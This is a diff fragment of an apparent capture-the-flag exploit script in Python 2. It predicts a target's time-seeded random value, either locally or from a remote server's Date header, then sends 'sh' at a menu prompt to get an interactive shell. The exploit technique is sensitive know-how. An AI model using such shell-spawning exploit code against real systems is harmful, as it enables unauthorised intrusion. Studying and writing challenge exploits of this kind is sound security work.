@@ -6,11 +6,12 @@ local = True
 # attack pseudo-random
 while True:
     if local:
-        leak = int(os.popen('./leak ' + str(int(time.time()))).read())
+        leak        = int(os.popen('./leak ' + str(int(time.time()))).read())
     else:
-        date = urllib2.urlopen('remote-server').headers['Date']
-        leak = int(time.mktime(time.strptime(date, '%a, %d %b %Y  %H:%M:%S %Z')))
-        leak += random.randint(0, 3)
+        date        = urllib2.urlopen('remote-server').headers['Date']
+        leak_time   = int(time.mktime(time.strptime(date, '%a, %d %b %Y  %H:%M:%S %Z')))
+        leak_time   += random.randint(0, 3)
+        leak        = int(os.popen('./leak ' + str(int(leak_time))).read())
     if leak ^ 0x40000000 >= 0x40000000:
         break
 print '[+] random leak\t:\t' + hex(leak)
@@ -56,4 +57,3 @@ io.rtl('Choose:')
 io.wl_af('Choose:', 'sh')
 
 io.itr()
-io.close()
